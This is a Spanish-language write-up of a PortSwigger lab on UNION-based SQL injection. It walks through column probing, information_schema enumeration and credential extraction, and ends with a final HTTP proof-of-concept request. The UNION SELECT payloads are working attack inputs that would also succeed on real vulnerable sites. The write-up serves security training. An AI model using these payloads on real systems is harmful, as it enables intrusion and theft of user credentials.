# [Portswigger] SQL-injection-attack, listing the database contents in non-Oracle databases

- **Módulo/Dificultad:** SQL injection| Practitioner
- **Herramienta principal:** Burp Suite (repeater)
- **Tiempo invertido:** ~15-20 minutos
- **CWE / Vulnerabilidad:** CWE-89 (SQL Injection - UNION Based Database Enumeration)

---

### 1. Vector y Punto de Entrada 
- **Endpoint afectado:** `Get /filter?category=Gifts`
- **Parámetro vulnerable:** `category`
- **Mecanismo del fallo:** El parámetro se concatena directamente en la consulta SQL subyacente sin parametrizar ni sanitizar. Los resultados devueltos por la base de datos se proyectan directamente en la vista HTML de la página web.

---

### 2. Flujo de explotación 
1. **Determinar número de columnas y tipos compatibles con texto:**
`' UNION SELECT 'a','b'--`
*(Devuelve HTTP 200 y refleja ambas cadenas en página, 2 columnas tipo VARCHAR).*
2. **Enumerar tablas con el SQL cheat sheet (`information_schema.tables--`):**
`' UNION SELECT table_name, null FROM information_schema.tables--`
*(Se identifica una tabla de usuarios con sufijo dinámico: ej. `users_xbgh`).*
3. **Enumerar columnas de esa tabla (`information_schema.columns`):**
`' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xbgh'--`).*
*(Se identifican las columnas: ej. `username_xbgh` y `password_xbgh`).*
4. **Extraer credenciales de la tabla identificada:**
`' UNION SELECT username_xbgh, password_xbgh FROM users_xbgh--`
*(Se obtiene la contraseña del usuario `admistrator`).*
5. **Autenticación:** Iniciar sesión en `/login` con las credenciales extraídas para resolver el laboratorio.

---

### 3. Payload clave (PoC final)

```http
GET /filter?category='+UNION+SELECT+username_xbgh,+password_xbgh+FROM+users_xbgh-- HTTP/1.1



